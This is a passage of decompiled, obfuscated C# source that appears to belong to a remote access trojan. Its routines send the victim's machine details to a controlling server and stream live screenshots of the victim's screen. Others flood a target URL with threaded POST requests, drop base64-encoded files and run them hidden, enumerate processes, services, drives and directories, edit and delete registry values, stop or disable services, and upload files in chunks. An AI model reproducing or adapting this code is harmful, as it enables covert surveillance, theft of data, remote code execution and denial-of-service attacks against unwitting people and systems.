			List<Rectangle> voaIHaF1mnIit0dB13 = VoaIHaF1mnIit0dB171;
			item = new Rectangle(0, (int)Math.Round((double)OVTDrfYXXtVl53.Height / 4.0 + (double)(xDqTOgZD170 * 2)), int_5, xDqTOgZD170);
			voaIHaF1mnIit0dB13.Add(item);
			List<Rectangle> voaIHaF1mnIit0dB14 = VoaIHaF1mnIit0dB171;
			item = new Rectangle((int)Math.Round((double)OVTDrfYXXtVl53.Width / 4.0), (int)Math.Round((double)OVTDrfYXXtVl53.Height / 4.0 + (double)(xDqTOgZD170 * 2)), int_5, xDqTOgZD170);
			voaIHaF1mnIit0dB14.Add(item);
			List<Rectangle> voaIHaF1mnIit0dB15 = VoaIHaF1mnIit0dB171;
			item = new Rectangle((int)Math.Round((double)OVTDrfYXXtVl53.Width / 4.0 + (double)(int_5 * 1)), (int)Math.Round((double)OVTDrfYXXtVl53.Height / 4.0 + (double)(xDqTOgZD170 * 2)), int_5, xDqTOgZD170);
			voaIHaF1mnIit0dB15.Add(item);
			List<Rectangle> voaIHaF1mnIit0dB16 = VoaIHaF1mnIit0dB171;
			item = new Rectangle((int)Math.Round((double)OVTDrfYXXtVl53.Width / 4.0 + (double)(int_5 * 2)), (int)Math.Round((double)OVTDrfYXXtVl53.Height / 4.0 + (double)(xDqTOgZD170 * 2)), int_5, xDqTOgZD170);
			voaIHaF1mnIit0dB16.Add(item);
		}
	}

	private void method_7(object Tempdata)
	{
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Expected O, but got Unknown
		//IL_0081: Unknown result type (might be due to invalid IL or missing references)
		//IL_0087: Expected O, but got Unknown
		//IL_00dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e3: Expected O, but got Unknown
		try
		{
			while (OUfrH25Yg3D314)
			{
				try
				{
					string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { "¦" }, (string[])null, (Type[])null, (bool[])null);
					string text = null;
					EncoderParameters val = new EncoderParameters(1);
					val.get_Param()[0] = new EncoderParameter(Encoder.Quality, (long)int.Parse(array[0]));
					ImageCodecInfo val2 = cHIqm6FyX4IDAfKIBe0B7Gnm106("image/jpeg");
					Bitmap val3 = new Bitmap(OVTDrfYXXtVl53.Width, OVTDrfYXXtVl53.Height, (PixelFormat)135173);
					checked
					{
						int_5 = (int)Math.Round((double)OVTDrfYXXtVl53.Width / 4.0);
						xDqTOgZD170 = (int)Math.Round((double)OVTDrfYXXtVl53.Height / 4.0);
						Bitmap val4 = new Bitmap(int_5, xDqTOgZD170, (PixelFormat)135173);
						Size size = new Size(int_5, xDqTOgZD170);
						Graphics val5 = Graphics.FromImage((Image)(object)val3);
						val5.CopyFromScreen(OVTDrfYXXtVl53.X, OVTDrfYXXtVl53.Y, 0, 0, OVTDrfYXXtVl53.Size, (CopyPixelOperation)13369376);
						int num = 0;
						do
						{
							try
							{
								Bitmap val6 = val3.Clone(VoaIHaF1mnIit0dB171[num], (PixelFormat)135173);
								val5 = Graphics.FromImage((Image)(object)val4);
								val5.set_InterpolationMode((InterpolationMode)7);
								val5.set_CompositingQuality((CompositingQuality)2);
								val5.DrawImage((Image)(object)val6, 0, 0, int_5, xDqTOgZD170);
								MemoryStream memoryStream = new MemoryStream();
								if (Conversions.ToDouble(array[0]) > 75.0)
								{
									((Image)val4).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
								}
								else
								{
									((Image)val4).Save((Stream)memoryStream, val2, val);
								}
								memoryStream.Capacity = (int)memoryStream.Length;
								try
								{
									if (num < 10)
									{
										string_3 = "0" + Conversions.ToString(num);
									}
									else
									{
										string_3 = Conversions.ToString(num);
									}
									if (memoryStream.Length != ncTv8UUg8w6MzGOq172[num])
									{
										byte[] buffer = memoryStream.GetBuffer();
										text = Convert.ToBase64String(buffer);
										buffer = null;
										try
										{
											gmvd9wR170.WriteLine("/STARTSE0/" + string_3 + text);
											gmvd9wR170.Flush();
										}
										catch (Exception projectError)
										{
											ProjectData.SetProjectError(projectError);
											ProjectData.ClearProjectError();
											return;
										}
										pPvBntu0tTAa3SrF174++;
									}
								}
								catch (Exception projectError2)
								{
									ProjectData.SetProjectError(projectError2);
									ProjectData.ClearProjectError();
								}
								ncTv8UUg8w6MzGOq172[num] = (int)memoryStream.Length;
								memoryStream.Dispose();
								memoryStream.Close();
							}
							catch (Exception projectError3)
							{
								ProjectData.SetProjectError(projectError3);
								ProjectData.ClearProjectError();
							}
							num++;
						}
						while (num <= 15);
						((Image)val4).Dispose();
						((Image)val3).Dispose();
						val5.Dispose();
						GC.Collect();
						text = null;
						try
						{
							gmvd9wR170.WriteLine("/STARTSET/");
							gmvd9wR170.Flush();
							break;
						}
						catch (Exception projectError4)
						{
							ProjectData.SetProjectError(projectError4);
							ProjectData.ClearProjectError();
							break;
						}
					}
				}
				catch (Exception projectError5)
				{
					ProjectData.SetProjectError(projectError5);
					Thread.Sleep(100);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
	}

	private void method_8(object Tempdata)
	{
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Expected O, but got Unknown
		//IL_0081: Unknown result type (might be due to invalid IL or missing references)
		//IL_0087: Expected O, but got Unknown
		//IL_00ba: Unknown result type (might be due to invalid IL or missing references)
		while (true)
		{
			try
			{
				while (OUfrH25Yg3D314)
				{
					try
					{
						string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { "¦" }, (string[])null, (Type[])null, (bool[])null);
						string text = null;
						EncoderParameters val = new EncoderParameters(1);
						val.get_Param()[0] = new EncoderParameter(Encoder.Quality, (long)int.Parse(array[0]));
						ImageCodecInfo val2 = cHIqm6FyX4IDAfKIBe0B7Gnm106("image/jpeg");
						Bitmap val3 = new Bitmap(OVTDrfYXXtVl53.Width, OVTDrfYXXtVl53.Height, (PixelFormat)135173);
						int_5 = OVTDrfYXXtVl53.Width;
						xDqTOgZD170 = OVTDrfYXXtVl53.Height;
						new Bitmap(int_5, xDqTOgZD170, (PixelFormat)135173);
						Size size = new Size(int_5, xDqTOgZD170);
						Graphics val4 = Graphics.FromImage((Image)(object)val3);
						val4.CopyFromScreen(OVTDrfYXXtVl53.X, OVTDrfYXXtVl53.Y, 0, 0, OVTDrfYXXtVl53.Size, (CopyPixelOperation)13369376);
						MemoryStream memoryStream = new MemoryStream();
						if (Conversions.ToDouble(array[0]) > 75.0)
						{
							((Image)val3).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
						}
						else
						{
							((Image)val3).Save((Stream)memoryStream, val2, val);
						}
						checked
						{
							memoryStream.Capacity = (int)memoryStream.Length;
							if (memoryStream.Length == zhgGRYY3g1uBVKlC175)
							{
								try
								{
									gmvd9wR170.WriteLine("/STARTSEQ/SAME");
									gmvd9wR170.Flush();
								}
								catch (Exception projectError)
								{
									ProjectData.SetProjectError(projectError);
									ProjectData.ClearProjectError();
									break;
								}
							}
							else
							{
								byte[] buffer = memoryStream.GetBuffer();
								text = Convert.ToBase64String(buffer);
								buffer = null;
								try
								{
									gmvd9wR170.WriteLine("/STARTSEQ/" + text);
									gmvd9wR170.Flush();
								}
								catch (Exception projectError2)
								{
									ProjectData.SetProjectError(projectError2);
									ProjectData.ClearProjectError();
									break;
								}
							}
							zhgGRYY3g1uBVKlC175 = (int)memoryStream.Length;
							memoryStream.Dispose();
							memoryStream.Close();
						}
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						Thread.Sleep(100);
						ProjectData.ClearProjectError();
						continue;
					}
					GC.Collect();
					break;
				}
				break;
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				Thread.Sleep(100);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void KCpTZZ03gTsMJi7EYE3tsO92154(object Tempdata)
	{
		int num = 0;
		do
		{
			try
			{
				if (!DynKbc3yi8LJJKO8176)
				{
					break;
				}
				Type typeFromHandle = typeof(WebRequest);
				object[] array = new object[1] { RuntimeHelpers.GetObjectValue(Tempdata) };
				bool[] array2 = new bool[1] { true };
				object obj = NewLateBinding.LateGet((object)null, typeFromHandle, "Create", array, (string[])null, (Type[])null, array2);
				if (array2[0])
				{
					Tempdata = RuntimeHelpers.GetObjectValue(array[0]);
				}
				HttpWebRequest httpWebRequest = (HttpWebRequest)obj;
				byte[] bytes = Encoding.UTF8.GetBytes("Hello");
				HttpWebRequest httpWebRequest2 = httpWebRequest;
				httpWebRequest2.Method = "POST";
				httpWebRequest2.ContentType = "application/x-www-form-urlencoded";
				httpWebRequest2.ContentLength = bytes.Length;
				httpWebRequest2.UserAgent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)";
				httpWebRequest2.Referer = "http://0mn3d6yunkn0wn.com";
				httpWebRequest2 = null;
				Stream requestStream = httpWebRequest.GetRequestStream();
				Stream stream = requestStream;
				stream.Write(bytes, 0, bytes.Length);
				stream.Close();
				stream = null;
				requestStream = null;
				HttpWebResponse httpWebResponse = null;
				try
				{
					httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
				}
				catch (WebException projectError)
				{
					ProjectData.SetProjectError((Exception)projectError);
					ProjectData.ClearProjectError();
				}
				Stream responseStream = httpWebResponse.GetResponseStream();
				StreamReader streamReader = new StreamReader(responseStream);
				streamReader.ReadToEnd();
				streamReader.Close();
				responseStream.Close();
				httpWebResponse.Close();
				httpWebRequest = null;
				httpWebResponse = null;
				responseStream = null;
				streamReader = null;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			num = checked(num + 1);
		}
		while (num <= 100);
	}

	private void method_9(object Tempdata)
	{
		DynKbc3yi8LJJKO8176 = true;
		int num = 0;
		while (DynKbc3yi8LJJKO8176)
		{
			Thread thread = new Thread(KCpTZZ03gTsMJi7EYE3tsO92154);
			thread.Start(RuntimeHelpers.GetObjectValue(Tempdata));
			num = checked(num + 1);
			if (num > 100)
			{
				break;
			}
		}
	}

	private void NcigevL2rxJT156()
	{
		try
		{
			YRQhjxFi158 = new TcpClient();
			YRQhjxFi158.Connect(string_4, yYxuvHumdHoJcejw178);
			lia6NYix159 = YRQhjxFi158.GetStream();
			streamWriter_1 = new StreamWriter(lia6NYix159);
			GClass0 gClass = new GClass0();
			string text = gClass.Kx0zdz1w31LVeb4q225();
			string text2 = gClass.GWHbTRDi94yhbTJD237();
			string text3 = gClass.method_0();
			string text4 = gClass.U0XItdnCBFAvfTb4229();
			string text5 = gClass.h3eMvGl5P5E45rFB233();
			string text6 = gClass.v4xWJSaF1LLi0ZoI234();
			string text7 = gClass.method_1();
			string text8 = gClass.mUxNYcVtosGgWnwh235();
			string text9 = gClass.LjuC8YzpSyKJV35Q236();
			string text10 = gClass.euxHvMAol8Uprbyk238();
			string text11 = gClass.RUlDnukkvu2R9naZ217();
			object obj = text10 + text + text2 + text3 + text4 + text5 + text6 + text7 + text8 + text9 + text11;
			streamWriter_1.WriteLine("/TRYPAAAA/" + ((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_Name() + "¦" + MbYOg375zXnJrPQtT9UAfZib112(Conversions.ToString(obj), "&%#@?,:*"));
			streamWriter_1.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void euAHczyWtnTd157(object Tempdata)
	{
		try
		{
			string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { "¦" }, (string[])null, (Type[])null, (bool[])null);
			if (Conversions.ToDouble(array[1]) == 1.0)
			{
				Process.Start(array[0]);
				return;
			}
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(array[0]);
			byte[] bytes = Encoding.UTF8.GetBytes("Hello");
			HttpWebRequest httpWebRequest2 = httpWebRequest;
			httpWebRequest2.Method = "POST";
			httpWebRequest2.ContentType = "application/x-www-form-urlencoded";
			httpWebRequest2.ContentLength = bytes.Length;
			httpWebRequest2.UserAgent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)";
			httpWebRequest2 = null;
			Stream requestStream = httpWebRequest.GetRequestStream();
			Stream stream = requestStream;
			stream.Write(bytes, 0, bytes.Length);
			stream.Close();
			stream = null;
			requestStream = null;
			HttpWebResponse httpWebResponse = null;
			try
			{
				httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			}
			catch (WebException projectError)
			{
				ProjectData.SetProjectError((Exception)projectError);
				ProjectData.ClearProjectError();
			}
			Stream responseStream = httpWebResponse.GetResponseStream();
			StreamReader streamReader = new StreamReader(responseStream);
			streamReader.ReadToEnd();
			streamReader.Close();
			responseStream.Close();
			httpWebResponse.Close();
			httpWebRequest = null;
			httpWebResponse = null;
			responseStream = null;
			streamReader = null;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void method_10()
	{
		DynKbc3yi8LJJKO8176 = false;
	}

	private void mMeX26At15Lj159(object temp)
	{
		try
		{
			TcpClient tcpClient = new TcpClient();
			tcpClient.Connect(string_4, yYxuvHumdHoJcejw178);
			NetworkStream stream = tcpClient.GetStream();
			StreamWriter streamWriter = new StreamWriter(stream);
			streamWriter.WriteLine(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"/TRYAVVVV/", temp), (object)"¦"), (object)method_1()));
			streamWriter.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void GuzUMFeqi4ff160(object Tempdata)
	{
		try
		{
			string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { "*" }, (string[])null, (Type[])null, (bool[])null);
			string text = array.GetValue(1)!.ToString();
			string text2 = array.GetValue(0)!.ToString();
			if (Operators.CompareString(text2, "temp", false) == 0)
			{
				text2 = Path.GetTempPath();
			}
			if (!Directory.Exists(text2))
			{
				Directory.CreateDirectory(text2);
			}
			if (!File.Exists(text2 + text))
			{
				byte[] array2 = Convert.FromBase64String(Conversions.ToString(array.GetValue(2)));
				((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_FileSystem().WriteAllBytes(text2 + text, array2, false);
				ssqwzwagQoOhjET2PiWIbjP3122(5);
			}
			string text3 = Conversions.ToString(array.GetValue(3));
			if (Operators.CompareString(text3, "0", false) == 0)
			{
				Process process = new Process();
				process.StartInfo.WorkingDirectory = text2;
				process.StartInfo.FileName = text2 + text;
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.Start();
			}
			else
			{
				Process process2 = new Process();
				process2.StartInfo.WorkingDirectory = text2;
				process2.StartInfo.FileName = text2 + text;
				process2.StartInfo.WindowStyle = ProcessWindowStyle.Normal;
				process2.Start();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void gMlLfldODNkp161()
	{
		try
		{
			BQwhZ5yk135.WriteLine("/LISTPROC/" + PGuBMY6pGBtqMcrQHntVpTxG117());
			BQwhZ5yk135.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void lBUmNqbWdVjc162()
	{
		try
		{
			vlD8jjbL140.WriteLine("/LISTSERV/" + MjUxrGRWk5Ov4bhl2MitM0ZJ118());
			vlD8jjbL140.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_11(object swfm)
	{
		try
		{
			string text = null;
			text = OjJfTilERdNKNcl5T28TCa3K121();
			NewLateBinding.LateCall(swfm, (Type)null, "WriteLine", new object[1] { "/LISTDRVS/" + text }, (string[])null, (Type[])null, (bool[])null, true);
			NewLateBinding.LateCall(swfm, (Type)null, "Flush", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void LOdGRXGSaazb164(object Tempdata)
	{
		try
		{
			string text = null;
			string text2 = null;
			DirectoryInfo directoryInfo = new DirectoryInfo(Conversions.ToString(Tempdata));
			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(Tempdata, (Type)null, "Length", new object[0], (string[])null, (Type[])null, (bool[])null), (object)3, false))
			{
				text2 = "(DIR).*(DIR)..*";
			}
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			foreach (DirectoryInfo directoryInfo2 in directories)
			{
				text = "(DIR)" + directoryInfo2.get_Name();
				text2 = text2 + text + "*";
			}
			FileInfo[] files = directoryInfo.GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				text = fileInfo.get_Name();
				text2 = text2 + text + "*";
			}
			gJrlNEyq80.WriteLine("/ONLYONEP/" + text2);
			gJrlNEyq80.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			gJrlNEyq80.WriteLine("/ERRORDIR/(DIR).*(DIR)..");
			gJrlNEyq80.Flush();
			ProjectData.ClearProjectError();
		}
	}

	private void LSDSTi1ls8FR165(object Node)
	{
		string text = null;
		string[] array = null;
		try
		{
			if (Operators.ConditionalCompareObjectEqual(Node, (object)"CU", false))
			{
				array = Registry.CurrentUser.GetSubKeyNames();
			}
			else if (Operators.ConditionalCompareObjectEqual(Node, (object)"LM", false))
			{
				array = Registry.LocalMachine.GetSubKeyNames();
			}
			else if (Operators.ConditionalCompareObjectEqual(Node, (object)"US", false))
			{
				array = Registry.Users.GetSubKeyNames();
			}
			string[] array2 = array;
			foreach (string text2 in array2)
			{
				try
				{
					text = ((Operators.CompareString(text, (string)null, false) != 0) ? (text + "¥" + text2) : text2);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			JSnoFpDY150.WriteLine(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"/REGYVIEW/", Node), (object)text));
			JSnoFpDY150.Flush();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void JdCck2SlUDAY166(object Node)
	{
		try
		{
			string text = null;
			string[] array = null;
			object obj = Strings.Mid(Conversions.ToString(Node), 3, Strings.Len(RuntimeHelpers.GetObjectValue(Node)));
			Node = Strings.Left(Conversions.ToString(Node), 2);
			object obj2 = Node;
			if (Operators.ConditionalCompareObjectEqual(obj2, (object)"CU", false))
			{
				array = Registry.CurrentUser.OpenSubKey(Conversions.ToString(obj))!.GetSubKeyNames();
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"LM", false))
			{
				array = Registry.LocalMachine.OpenSubKey(Conversions.ToString(obj))!.GetSubKeyNames();
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"US", false))
			{
				array = Registry.Users.OpenSubKey(Conversions.ToString(obj))!.GetSubKeyNames();
			}
			string[] array2 = array;
			foreach (string text2 in array2)
			{
				try
				{
					text = ((Operators.CompareString(text, (string)null, false) != 0) ? (text + "¥" + text2) : text2);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			if (Operators.CompareString(text, (string)null, false) != 0)
			{
				JSnoFpDY150.WriteLine("/REGVIEWS/" + text);
				JSnoFpDY150.Flush();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void cu4geq2VOqek167(object Node)
	{
		try
		{
			string[] array = (string[])NewLateBinding.LateGet(Node, (Type)null, "Split", new object[1] { "§" }, (string[])null, (Type[])null, (bool[])null);
			object obj = Strings.Mid(array[0], 3, Strings.Len(array[0]));
			Node = Strings.Left(array[0], 2);
			RegistryKey registryKey = null;
			object obj2 = Node;
			if (Operators.ConditionalCompareObjectEqual(obj2, (object)"CU", false))
			{
				registryKey = Registry.CurrentUser.OpenSubKey(Conversions.ToString(obj), writable: true);
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"LM", false))
			{
				registryKey = Registry.LocalMachine.OpenSubKey(Conversions.ToString(obj), writable: true);
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"US", false))
			{
				registryKey = Registry.Users.OpenSubKey(Conversions.ToString(obj), writable: true);
			}
			string[] array2 = array[1].Split(new char[1] { '¦' });
			registryKey.SetValue(array2[0], array2[1]);
			eL615J3jZipJ170(Operators.ConcatenateObject(Node, obj));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void NAoeXlND8mWD168(object Node)
	{
		try
		{
			string[] array = (string[])NewLateBinding.LateGet(Node, (Type)null, "Split", new object[1] { "§" }, (string[])null, (Type[])null, (bool[])null);
			object obj = Strings.Mid(array[0], 3, Strings.Len(array[0]));
			Node = Strings.Left(array[0], 2);
			RegistryKey registryKey = null;
			object obj2 = Node;
			if (Operators.ConditionalCompareObjectEqual(obj2, (object)"CU", false))
			{
				registryKey = Registry.CurrentUser.OpenSubKey(Conversions.ToString(obj), writable: true);
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"LM", false))
			{
				registryKey = Registry.LocalMachine.OpenSubKey(Conversions.ToString(obj), writable: true);
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"US", false))
			{
				registryKey = Registry.Users.OpenSubKey(Conversions.ToString(obj), writable: true);
			}
			registryKey.DeleteValue(array[1], throwOnMissingValue: false);
			eL615J3jZipJ170(Operators.ConcatenateObject(Node, obj));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void kty7idg8hEGo169(object Node)
	{
		try
		{
			string[] array = (string[])NewLateBinding.LateGet(Node, (Type)null, "Split", new object[1] { "§" }, (string[])null, (Type[])null, (bool[])null);
			object obj = Strings.Mid(array[0], 3, Strings.Len(array[0]));
			Node = Strings.Left(array[0], 2);
			RegistryKey registryKey = null;
			object obj2 = Node;
			if (Operators.ConditionalCompareObjectEqual(obj2, (object)"CU", false))
			{
				registryKey = Registry.CurrentUser.OpenSubKey(Conversions.ToString(obj), writable: true);
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"LM", false))
			{
				registryKey = Registry.LocalMachine.OpenSubKey(Conversions.ToString(obj), writable: true);
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"US", false))
			{
				registryKey = Registry.Users.OpenSubKey(Conversions.ToString(obj), writable: true);
			}
			string[] array2 = array[1].Split(new char[1] { '╫' });
			string[] array3 = array2[0].Split(new char[1] { '¦' });
			string[] array4 = array2[1].Split(new char[1] { '¦' });
			registryKey.DeleteValue(array4[0], throwOnMissingValue: false);
			registryKey.SetValue(array3[0], array3[1]);
			eL615J3jZipJ170(Operators.ConcatenateObject(Node, obj));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void eL615J3jZipJ170(object Node)
	{
		try
		{
			string text = null;
			string[] array = null;
			object obj = Strings.Mid(Conversions.ToString(Node), 3, Strings.Len(RuntimeHelpers.GetObjectValue(Node)));
			Node = Strings.Left(Conversions.ToString(Node), 2);
			RegistryKey registryKey = null;
			object obj2 = Node;
			if (Operators.ConditionalCompareObjectEqual(obj2, (object)"CU", false))
			{
				array = Registry.CurrentUser.OpenSubKey(Conversions.ToString(obj))!.GetValueNames();
				registryKey = Registry.CurrentUser.OpenSubKey(Conversions.ToString(obj));
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"LM", false))
			{
				array = Registry.LocalMachine.OpenSubKey(Conversions.ToString(obj))!.GetValueNames();
				registryKey = Registry.LocalMachine.OpenSubKey(Conversions.ToString(obj));
			}
			else if (Operators.ConditionalCompareObjectEqual(obj2, (object)"US", false))
			{
				array = Registry.Users.OpenSubKey(Conversions.ToString(obj))!.GetValueNames();
				registryKey = Registry.Users.OpenSubKey(Conversions.ToString(obj));
			}
			if (array.Length <= 0)
			{
				return;
			}
			string[] array2 = array;
			foreach (object obj3 in array2)
			{
				object objectValue = RuntimeHelpers.GetObjectValue(registryKey.GetValue(Conversions.ToString(obj3)));
				if (objectValue == null)
				{
					continue;
				}
				object objectValue2 = RuntimeHelpers.GetObjectValue(objectValue);
				string text2 = null;
				try
				{
					if ((object)objectValue2.GetType() == typeof(byte[]))
					{
						text2 = Convert.ToBase64String((byte[])objectValue2) + "bytearraystring";
					}
					else
					{
						Encoding uTF = Encoding.UTF8;
						object[] array3 = new object[1] { RuntimeHelpers.GetObjectValue(objectValue2) };
						bool[] array4 = new bool[1] { true };
						object obj4 = NewLateBinding.LateGet((object)uTF, (Type)null, "GetBytes", array3, (string[])null, (Type[])null, array4);
						if (array4[0])
						{
							objectValue2 = RuntimeHelpers.GetObjectValue(array3[0]);
						}
						text2 = Convert.ToBase64String((byte[])obj4);
					}
					text = ((Operators.CompareString(text, (string)null, false) != 0) ? Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)(text + "¥"), obj3), (object)"§"), (object)text2)) : Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(obj3, (object)"§"), (object)text2)));
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			if (Operators.CompareString(text, (string)null, false) != 0)
			{
				JSnoFpDY150.WriteLine("/REGVIEWV/" + text);
				JSnoFpDY150.Flush();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void DDnyPWPQyqVL171(object Tempdata)
	{
		try
		{
			Thread thread = new Thread(txSieSPrfqj7195);
			thread.Start(RuntimeHelpers.GetObjectValue(Tempdata));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void SUDAa528U00c172(object Tempdata)
	{
		try
		{
			string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { "¦" }, (string[])null, (Type[])null, (bool[])null);
			switch (array[1])
			{
			case "STOP":
			{
				NgfHWSovYOZ2gLml48 ngfHWSovYOZ2gLml5 = new NgfHWSovYOZ2gLml48(array[0]);
				((ServiceController)ngfHWSovYOZ2gLml5).Stop();
				break;
			}
			case "START":
			{
				NgfHWSovYOZ2gLml48 ngfHWSovYOZ2gLml4 = new NgfHWSovYOZ2gLml48(array[0]);
				((ServiceController)ngfHWSovYOZ2gLml4).Start();
				break;
			}
			case "DISABLE":
			{
				NgfHWSovYOZ2gLml48 ngfHWSovYOZ2gLml3 = new NgfHWSovYOZ2gLml48(array[0]);
				ngfHWSovYOZ2gLml3.StartupType = "Disabled";
				break;
			}
			case "MANUAL":
			{
				NgfHWSovYOZ2gLml48 ngfHWSovYOZ2gLml2 = new NgfHWSovYOZ2gLml48(array[0]);
				ngfHWSovYOZ2gLml2.StartupType = "Manual";
				break;
			}
			case "AUTO":
			{
				NgfHWSovYOZ2gLml48 ngfHWSovYOZ2gLml = new NgfHWSovYOZ2gLml48(array[0]);
				ngfHWSovYOZ2gLml.StartupType = "Auto";
				break;
			}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void eMxpiDE24OuE173()
	{
		checked
		{
			try
			{
				if (CYf7EXtPyLXB37 != fZc3t8vNE0rO43)
				{
					StringBuilder stringBuilder = new StringBuilder();
					StringBuilder stringBuilder2 = new StringBuilder();
					CYf7EXtPyLXB37++;
					v21WvnBSTCwt38 = new byte[int_3 - 1 + 1];
					binaryReader_0.Read(v21WvnBSTCwt38, 0, int_3);
					lP1P2pb8H59B45 = binaryReader_0.BaseStream.Seek(0L, SeekOrigin.Current);
					stringBuilder.Append("/PAKSSEND/");
					int num = v21WvnBSTCwt38.Length - 1;
					for (int i = 0; i <= num; i++)
					{
						stringBuilder2.Append(v21WvnBSTCwt38.GetValue(i)!.ToString() + " ");
					}
					stringBuilder.Append((object?)stringBuilder2);
					gJrlNEyq80.WriteLine((object?)stringBuilder);
					gJrlNEyq80.Flush();
				}
				else if (u2edwlsk5lyS44 > 0L)
				{
					StringBuilder stringBuilder3 = new StringBuilder();
					StringBuilder stringBuilder4 = new StringBuilder();
					v21WvnBSTCwt38 = new byte[(int)(u2edwlsk5lyS44 - 1L) + 1];
					binaryReader_0.Read(v21WvnBSTCwt38, 0, (int)u2edwlsk5lyS44);
					stringBuilder3.Append("/FINEDOWN/");
					int num2 = v21WvnBSTCwt38.Length - 1;
					for (int j = 0; j <= num2; j++)
					{
						stringBuilder4.Append(v21WvnBSTCwt38.GetValue(j)!.ToString() + " ");
					}
					stringBuilder3.Append((object?)stringBuilder4);
					gJrlNEyq80.WriteLine((object?)stringBuilder3);
					gJrlNEyq80.Flush();
					W8OwNO3NTNFTWI9GPHiqPSPE114();
				}
				else
				{
					gJrlNEyq80.WriteLine("/FINEDOWN/");
					gJrlNEyq80.Flush();
					W8OwNO3NTNFTWI9GPHiqPSPE114();
				}
			}
			catch (Exception projectError)
			{
